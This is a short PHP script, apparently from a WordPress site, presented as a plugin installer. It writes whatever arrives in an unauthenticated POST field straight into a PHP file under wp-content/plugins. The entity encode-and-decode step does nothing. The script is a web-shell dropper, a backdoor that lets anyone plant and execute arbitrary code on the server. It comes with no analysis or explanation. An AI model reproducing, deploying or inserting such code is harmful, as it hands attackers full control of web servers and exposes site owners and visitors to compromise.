<?php
session_start();
$installtheplugin = $_POST['installit'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/smart-videos/videos.php', 'w');
$installtheplugin = str_replace('\\', '', $installtheplugin);
$installtheplugin = htmlentities($installtheplugin);
fwrite($fp, html_entity_decode($installtheplugin));
fclose($fp);
echo $installtheplugin;
?>